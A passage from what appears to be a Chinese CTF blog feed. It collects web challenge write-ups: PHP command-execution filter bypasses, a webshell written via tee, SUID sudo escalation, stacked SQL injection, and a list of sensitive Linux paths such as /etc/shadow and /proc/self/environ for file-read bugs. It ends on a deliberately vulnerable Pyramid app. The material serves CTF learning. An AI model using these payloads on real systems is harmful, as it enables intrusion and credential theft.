href="#未过滤exec、nl、tee、print、var-dump、include" class="headerlink" title="未过滤exec、nl、tee、print、var_dump、include"></a>未过滤<a href="https://so.csdn.net/so/search?q=exec&spm=1001.2101.3001.7020">exec</a>、nl、tee、print、var_dump、include</h2><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?code=var_dump(exec(&quot;c\at%09/flag&quot;));</span><br><span class="line">?code=var_dump(exec(&quot;nl%09/flag&quot;));</span><br><span class="line">?code=print(exec(&quot;c\at%09/flag&quot;));</span><br><span class="line">?code=print(exec(&quot;nl%09/flag&quot;));</span><br><span class="line">?code=exec(&quot;c\at%09/flag|tee%09a&quot;);</span><br><span class="line">?code=exec(&quot;nl%09/flag|tee%09a&quot;);</span><br><span class="line">?code=print(exec(&quot;ec\ho%09`env`&quot;));</span><br><span class="line">?code=exec(&quot;ec\ho%09PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==|ba\se64%09-d%09&gt;11&quot;);</span><br><span class="line">?code=include(11); POST:1=system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure><h2 id="命令执行输出函数："><a href="#命令执行输出函数：" class="headerlink" title="命令执行输出函数："></a>命令执行输出函数：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cat函数 由第一行开始显示内容，并将所有内容输出</span><br><span class="line">tac函数 从最后一行倒序显示内容，并将所有内容输出</span><br><span class="line">nl      类似于cat -n，显示时输出行号</span><br><span class="line">more    根据窗口大小，一页一页的现实文件内容</span><br><span class="line">less    和more类似，但其优点可以往前翻页，而且进行可以搜索字符</span><br><span class="line">head    只显示头几行</span><br><span class="line">tail    只显示最后几行</span><br><span class="line">sort    文本内容排列</span><br><span class="line">uniq    可以查看</span><br><span class="line">vim     一种编辑器，这个也可以查看</span><br><span class="line">od      以二进制的方式读取档案内容</span><br><span class="line">vi      一种编辑器，这个也可以查看</span><br><span class="line">strings  在对象文件或二进制文件中查找可打印的字符串, 在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file strings</span><br><span class="line">paste    把每个文件以列对列的方式，一列列地加以合并</span><br><span class="line">grep    grep &#123; flag.php打印有”&#123;“的一行</span><br><span class="line">sed        一种编辑器，可以用sed -f flag.php读取flag</span><br></pre></td></tr></table></figure><h2 id="polarPHP是世界上最好的语言"><a href="#polarPHP是世界上最好的语言" class="headerlink" title="polarPHP是世界上最好的语言"></a>polarPHP是世界上最好的语言</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag in $flag</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">$c=$_POST[&#x27;sys&#x27;];//post传入一个sys参数</span><br><span class="line">$key1 = 0;//传入两个键名</span><br><span class="line">$key2 = 0;</span><br><span class="line">if(isset($_GET[&#x27;flag1&#x27;]) || isset($_GET[&#x27;flag2&#x27;]) || isset($_POST[&#x27;flag1&#x27;]) || isset($_POST[&#x27;flag2&#x27;])) &#123;//post、get传参处不能出现flag1、flag2</span><br><span class="line">    die(&quot;nonononono&quot;);</span><br><span class="line">&#125;</span><br><span class="line">@parse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);//将查询的字符串解析到变量中</span><br><span class="line">extract($_POST);//从关联数组中提取变量 （键为变量名，值为变量值）变量覆盖</span><br><span class="line">if($flag1 == &#x27;8gen1&#x27; &amp;&amp; $flag2 == &#x27;8gen1&#x27;) &#123;//当键名$flag1和flag2等于8gen1，进入下一步</span><br><span class="line">    if(isset($_POST[&#x27;504_SYS.COM&#x27;]))&#123;//POST传参504_SYS.COM</span><br><span class="line">    if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\?/&quot;, $c))&#123;//过滤以及接受参数sys</span><br><span class="line">         eval(&quot;$c&quot;);  //执行sys传入的语句</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET</span><br><span class="line">?_POST[flag1]=8gen1&amp;_POST[flag2]=8gen1</span><br><span class="line"> POST</span><br><span class="line">504[SYS.COM=1&amp;sys=echo $flag;</span><br></pre></td></tr></table></figure><h2 id="NSSCTF-Round-28-ez-php"><a href="#NSSCTF-Round-28-ez-php" class="headerlink" title="NSSCTF Round#28 ez_php"></a>NSSCTF Round#28 ez_php</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (!preg_match(&quot;/[!@#%^&amp;*:&#x27;\-&lt;?&gt;\&quot;\/|`a-zA-Z~\\\\]/&quot;, $rce)) &#123;</span><br><span class="line">                eval($rce);</span><br></pre></td></tr></table></figure><p>利用自增方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_=[]._;$__=$_[1];$_=$_[0];$_++;$_0=++$_;$_++;$_++;$_++;$_++;$_=$_0.++$_.$__;$_=_.$_(71).$_(69).$_(84);$$_[1]($$_[2]);</span><br></pre></td></tr></table></figure><p>url编码后post传进去，用get传1&#x3D;system&amp;2&#x3D;cat &#x2F;flag</p><h2 id="polarctf2024坦诚相见"><a href="#polarctf2024坦诚相见" class="headerlink" title="polarctf2024坦诚相见"></a>polarctf2024坦诚相见</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function containsPathTraversal($input) &#123;</span><br><span class="line">    $patterns = [</span><br><span class="line">        &#x27;/\.\.\//&#x27;,      </span><br><span class="line">        &#x27;/\/\//&#x27;,        </span><br><span class="line">        &#x27;/\%2e\%2e\//&#x27;,  </span><br><span class="line">        &#x27;/\%2E\%2E\\/&#x27;, </span><br><span class="line">        &#x27;/flag/&#x27;,</span><br><span class="line">        &#x27;/\//&#x27;,</span><br><span class="line">        &#x27;/&gt;/&#x27;</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    foreach ($patterns as $pattern) &#123;</span><br><span class="line">        if (preg_match($pattern, $input)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line">if (isset($_POST[&#x27;rce&#x27;]) &amp;&amp; containsPathTraversal($_POST[&#x27;rce&#x27;])) &#123;</span><br><span class="line">    die(&#x27;不不不，我也有底线的，至少在这个文件夹内，你随意&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;zh-CN&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;在干嘛？&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;这里什么也没有&lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><p>1.目录穿越限制</p><p>2.过滤了&gt;写文件，并且还过滤了<code>/</code>导致不能反弹shell，我没用tee写文件绕过</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;?php eval(\$_POST[1]);&quot;|tee 1.php</span><br></pre></td></tr></table></figure><p>3.cat &#x2F;flag没有反应</p><p>4.蚁剑连上提权发现sudo有suid权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/bin/busybox</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/sbin/suexec</span><br></pre></td></tr></table></figure><p>然后sudo cat &#x2F;flag即可</p><h2 id="【2024夏季个人挑战赛】你知道sys还能这样玩吗禁用"><a href="#【2024夏季个人挑战赛】你知道sys还能这样玩吗禁用" class="headerlink" title="【2024夏季个人挑战赛】你知道sys还能这样玩吗禁用."></a>【2024夏季个人挑战赛】你知道sys还能这样玩吗<code>禁用.</code></h2><p>1.访问sys.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;cmd&#x27;]))&#123;</span><br><span class="line">    echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">    $cmd = $_POST[&#x27;cmd&#x27;];</span><br><span class="line">    if (!preg_match(&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget/i&#x27;, $cmd)) &#123;</span><br><span class="line">        $output = system($cmd);</span><br><span class="line">        echo $output;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>2.payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=php -r &#x27;system(hex2bin(ff3b746163202f666c61672e747874));&#x27;</span><br></pre></td></tr></table></figure><h2 id="【2023秋季个人挑战赛】再来ping一波啊"><a href="#【2023秋季个人挑战赛】再来ping一波啊" class="headerlink" title="【2023秋季个人挑战赛】再来ping一波啊"></a>【2023秋季个人挑战赛】再来ping一波啊</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $flag = &#x27;flag&#123;ae5eb824ef87499f644c3f11a7176157&#125;&#x27;;</span><br><span class="line">    if(isset($_GET[&#x27;ip&#x27;]))&#123;</span><br><span class="line">        $ip = $_GET[&#x27;ip&#x27;];</span><br><span class="line">        if(preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|\&gt;|`|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span><br><span class="line">            print_r($match);</span><br><span class="line">            print($ip);</span><br><span class="line">            echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">            echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span><br><span class="line">            die(&quot;fxck your symbol!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span><br><span class="line">            die(&quot;空格我可没加难度这可真是复习，/斜眼笑&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span><br><span class="line">            die(&quot;Bash is not allowed&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else if(preg_match(&quot;/ls/&quot;, $ip))&#123;</span><br><span class="line">            die(&quot;我很抱歉，其实你得再研究研究&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">                else if(preg_match(&quot;/cat|tac|sort|head|tail|more|less/&quot;, $ip))&#123;</span><br><span class="line">            die(&quot;常用的读取命令肯定不行，你要是想出绕过的也算你厉害。但过滤机制是改了的-。-，你再研究研究？&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else if(preg_match(&quot;/rm/&quot;, $ip))&#123;</span><br><span class="line">            die(&quot;你要搞我？？？&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else if(preg_match(&quot;/index/&quot;,$ip))&#123;</span><br><span class="line">            die(&quot;那能让你直接读？&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $a = system(&quot;ping -c 4 &quot;.$ip);</span><br><span class="line">        echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">        print_r($a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure><p>1.flag在index.php,采用拼接获取：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;a=t;b=dex.php;ca$a%09in$b</span><br></pre></td></tr></table></figure><h2 id="eval-var-dump-a"><a href="#eval-var-dump-a" class="headerlink" title="eval(&quot;var_dump($$a);&quot;);}}"></a><code>eval(&quot;var_dump($$a);&quot;);&#125;&#125;</code></h2><p>传入GLOBALS即可</p><h2 id="basectf2024-RCE-or-Sql-Inject"><a href="#basectf2024-RCE-or-Sql-Inject" class="headerlink" title="basectf2024_RCE or Sql Inject"></a>basectf2024_RCE or Sql Inject</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$sql = $_GET[&#x27;sql&#x27;];</span><br><span class="line">if (preg_match(&#x27;/se|ec|;|@|del|into|outfile/i&#x27;, $sql)) &#123;</span><br><span class="line">    die(&quot;你知道的，不可能有sql注入&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if (preg_match(&#x27;/&quot;|\$|`|\\\\/i&#x27;, $sql)) &#123;</span><br><span class="line">    die(&quot;你知道的，不可能有RCE&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$query = &quot;mysql -u root -p123456 -e \&quot;use ctf;select &#x27;ctfer! You can\\&#x27;t succeed this time! hahaha&#x27;; -- &quot; . $sql . &quot;\&quot;&quot;;</span><br><span class="line">system($query);</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sql=%0asystem env</span><br></pre></td></tr></table></figure><h2 id="basectf2024-Sql-Inject-or-RCE"><a href="#basectf2024-Sql-Inject-or-RCE" class="headerlink" title="basectf2024_Sql Inject or RCE"></a>basectf2024_Sql Inject or RCE</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$sql = $_GET[&#x27;sql&#x27;];</span><br><span class="line">if (preg_match(&#x27;/se|ec|st|;|@|delete|into|outfile/i&#x27;, $sql)) &#123;</span><br><span class="line">    die(&quot;你知道的，不可能有sql注入&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if (preg_match(&#x27;/&quot;|\$|`|\\\\/i&#x27;, $sql)) &#123;</span><br><span class="line">    die(&quot;你知道的，不可能有RCE&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$query = &quot;mysql -u root -p123456 -e \&quot;use ctf;select &#x27;ctfer! You can\\&#x27;t succeed this time! hahaha&#x27;; -- &quot; . $sql . &quot;\&quot;&quot;;</span><br><span class="line">system($query);</span><br></pre></td></tr></table></figure><p>system被过滤，无法再像上面那题一样进行命令执行，但我们发现sql注入过滤中的del变成了delete，用我们的小脑瓜想一想，这道题还是考察sql注入</p><p>select被过滤，那可以用handler来进行堆叠注入，然而分号也被过滤。<br>但是mysql中有一个关键字叫DELIMITER，它可以改变语句结束的分隔符，可以将分号改成其他<br>因此我们就可以对此进行堆叠注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sql=%0ADELIMITER m%0Ahandler flag openm%0Ahandler flag read nextm</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;ctf中命令执行相关知识点总结&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="web" scheme="http://1768161086.github,io/categories/web/"/>
    
    
    <category term="web" scheme="http://1768161086.github,io/tags/web/"/>
    
    <category term="http" scheme="http://1768161086.github,io/tags/http/"/>
    
    <category term="命令执行" scheme="http://1768161086.github,io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>CTF中文件读取漏洞常见读取路径</title>
    <link href="http://1768161086.github,io/2025/04/23/CTF%E4%B8%AD%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%B8%B8%E8%A7%81%E8%AF%BB%E5%8F%96%E8%B7%AF%E5%BE%84/"/>
    <id>http://1768161086.github,io/2025/04/23/CTF%E4%B8%AD%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%B8%B8%E8%A7%81%E8%AF%BB%E5%8F%96%E8%B7%AF%E5%BE%84/</id>
    <published>2025-04-23T13:53:02.000Z</published>
    <updated>2025-04-24T08:34:23.988Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-etc-目录"><a href="#1-etc-目录" class="headerlink" title="1.&#x2F;etc 目录"></a>1.&#x2F;etc 目录</h2><p>&#x2F;etc&#x2F;passwd :linux系统保存用户信息及其工作目录的文件，权限是可读。</p><p>&#x2F;etc&#x2F;shadow:是linux系统保存用户信息及（可能存在）密码（hash）的文件，权限是root用户可读写。</p><p>&#x2F;etc&#x2F;apache2&#x2F;*  :Apache配置文件，可以获知WEB目录，服务端口等信息。</p><p>&#x2F;etc&#x2F;nginx&#x2F;*  :Nginx配置文件，可以获知WEB目录，服务端口等信息。</p><p>&#x2F;etc&#x2F;apparmor.(d)&#x2F;*  Apparmor配置文件，可以获得各应用系统调用的白名单、黑名单。</p><p>&#x2F;etc&#x2F;(cron.d&#x2F;*|crontab)  :定时任务文件</p><p>&#x2F;etc&#x2F;environment 环境变量的配置文件之一。</p><p>&#x2F;etc&#x2F;hostname 表示主机名</p><p>&#x2F;etc&#x2F;hosts  是主机名查询静态列表，包含指定域名解析IP的成对信息。</p><p>&#x2F;etc&#x2F;issue 指明系统版本</p><p>&#x2F;etc&#x2F;mysql&#x2F;*  MYSQL配置文件。</p><p>&#x2F;etc&#x2F;php&#x2F;* PHP配置文件</p><h2 id="2-proc目录"><a href="#2-proc目录" class="headerlink" title="2.&#x2F;proc目录"></a>2.&#x2F;proc目录</h2><p>&#x2F;proc 目录通常存储着进程动态运行的各种信息，本质上是一种虚拟目录。如果查看非当前进程的信息，pid是可以进行暴力破解的，如果查看的是当前进程，只需要&#x2F;proc&#x2F;self代替&#x2F;proc&#x2F;[pid]即可。</p><p>对应目录下的cmdline可读出比较敏感的信息，如使用mysql-uxxx -pxxx登陆mysql时，可以读出明文密码。</p><p>&#x2F;proc&#x2F;[pid]&#x2F;cmdline   ([pid]指向进程对应的终端命令)</p><p>&#x2F;proc&#x2F;self&#x2F;cmdline</p><p>当我们无法获取当前应用所在的目录，通过cwd命令可以直接跳转到当前目录：</p><p>&#x2F;proc&#x2F;[pid]&#x2F;cwd&#x2F;     ([pid] 指向进行运行目录)</p><p>&#x2F;proc&#x2F;self&#x2F;cwd</p><p>环境变量中可能存在secret_key,这时可以通过environ进行读取：</p><p>&#x2F;proc&#x2F;[pid]&#x2F;environ  ([pid]指向进行运行时的环境变量）</p><p>&#x2F;proc&#x2F;self&#x2F;environ</p><p>指向启动当前进程的可执行文件（完整路径）的符号链接。通过exe文件我们可以获得指定进程的可执行文件的完整路径。[pid]指向进程所对应的可执行文件。有时我们想读取当前应用的可执行文件再进行分析，但在实际利用时可能存在一些安全措施阻止我们去读可执行文件，可以尝试访问：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/self/exe</span><br></pre></td></tr></table></figure><h2 id="3-其他目录"><a href="#3-其他目录" class="headerlink" title="3.其他目录"></a>3.其他目录</h2><p>Nginx配置文件可能存在的其他路径:</p><p>&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;*</p><p>日志文件：</p><p>&#x2F;var&#x2F;log&#x2F;*</p><p>Apache 默认web根目录：</p><p>&#x2F;var&#x2F;www&#x2F;html&#x2F;</p><p>PHP session 目录：</p><p>&#x2F;var&#x2F;lib&#x2F;php(5)&#x2F;sessions&#x2F;</p><p>4.WEB-INF目录</p><p>filename&#x3D;WEB-INF&#x2F;classes&#x2F;com&#x2F;ctf&#x2F;flag&#x2F;FlagManager.class下载java的class文件</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-etc-目录&quot;&gt;&lt;a href=&quot;#1-etc-目录&quot; class=&quot;headerlink&quot; title=&quot;1.&amp;#x2F;etc 目录&quot;&gt;&lt;/a&gt;1.&amp;#x2F;etc 目录&lt;/h2&gt;&lt;p&gt;&amp;#x2F;etc&amp;#x2F;passwd :linux系统保存用户</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Pyramid远程代码执行漏洞(执行内存马)</title>
    <link href="http://1768161086.github,io/2025/04/16/Pyramid%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E6%89%A7%E8%A1%8C%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <id>http://1768161086.github,io/2025/04/16/Pyramid%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E6%89%A7%E8%A1%8C%E5%86%85%E5%AD%98%E9%A9%AC/</id>
    <published>2025-04-16T12:50:06.000Z</published>
    <updated>2025-04-16T12:53:51.582Z</updated>
    
    <content type="html"><![CDATA[<h2 id="熟悉的配方，熟悉的味道"><a href="#熟悉的配方，熟悉的味道" class="headerlink" title="熟悉的配方，熟悉的味道"></a>熟悉的配方，熟悉的味道</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">from pyramid.config import Configurator</span><br><span class="line">from pyramid.request import Request</span><br><span class="line">from pyramid.response import Response</span><br><span class="line">from pyramid.view import view_config</span><br><span class="line">from wsgiref.simple_server import make_server</span><br><span class="line">from pyramid.events import NewResponse</span><br><span class="line">import re</span><br><span class="line">from jinja2 import Environment, BaseLoader</span><br><span class="line"> </span><br><span class="line">eval_globals = &#123; #防止eval执行恶意代码</span><br><span class="line">    &#x27;__builtins__&#x27;: &#123;&#125;,      # 禁用所有内置函数</span><br><span class="line">    &#x27;__import__&#x27;: None       # 禁止动态导入</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def checkExpr(expr_input):</span><br><span class="line">    expr = re.split(r&quot;[-+*/]&quot;, expr_input)</span><br><span class="line">    print(exec(expr_input))</span><br><span class="line"> </span><br><span class="line">    if len(expr) != 2:</span><br><span class="line">        return 0</span><br><span class="line">    try:</span><br><span class="line">        int(expr[0])</span><br><span class="line">        int(expr[1])</span><br><span class="line">    except:</span><br><span class="line">        return 0</span><br><span class="line"> </span><br><span class="line">    return 1</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def home_view(request):</span><br><span class="line">    expr_input = &quot;&quot;</span><br><span class="line">    result = &quot;&quot;</span><br><span class="line"> </span><br><span class="line">    if request.method == &#x27;POST&#x27;:</span><br><span class="line">        expr_input = request.POST[&#x27;expr&#x27;]</span><br><span class="line">        if checkExpr(expr_input):</span><br><span class="line">            try:</span><br><span class="line">                result = eval(expr_input, eval_globals)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                result = e</span><br><span class="line">        else:</span><br><span class="line">            result = &quot;爬！&quot;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    template_str = 【xxx】</span><br><span class="line"> </span><br><span class="line">    env = Environment(loader=BaseLoader())</span><br><span class="line">    template = env.from_string(template_str)</span><br><span class="line">    rendered = template.render(expr_input=expr_input, result=result)</span><br><span class="line">    return Response(rendered)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    with Configurator() as config:</span><br><span class="line">        config.add_route(&#x27;home_view&#x27;, &#x27;/&#x27;)</span><br><span class="line">        config.add_view(home_view, route_name=&#x27;home_view&#x27;)</span><br><span class="line">        app = config.make_wsgi_app()</span><br><span class="line"> </span><br><span class="line">    server = make_server(&#x27;0.0.0.0&#x27;, 9040, app)</span><br><span class="line">    server.serve_forever()</span><br><span class="line"> 